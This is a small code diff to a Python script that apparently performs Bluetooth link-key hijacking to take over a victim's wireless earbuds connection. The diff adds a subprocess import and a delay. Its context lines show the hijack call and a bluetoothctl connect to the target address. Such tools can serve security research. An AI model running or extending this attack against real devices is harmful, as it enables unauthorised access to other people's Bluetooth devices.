@@ -2,6 +2,7 @@
 
 import os
 import sys
+import subprocess
 import time
 import tools.emulator.rules.constants as consts
 from gi.repository import GLib
@@ -68,6 +69,8 @@ try:
     bt_sock.key_hijacking()
     print_status("Link key hijacking successful!", "success")
 
+    print_status("Connecting to buds in 5 sec...", "success")
+    time.sleep(5)
     print_status("Connecting to buds...", "info")
     subprocess.run(["bluetoothctl", "connect", bt_addr])
     print_status("\nYou have hijacked the connect to the buds!", "success")
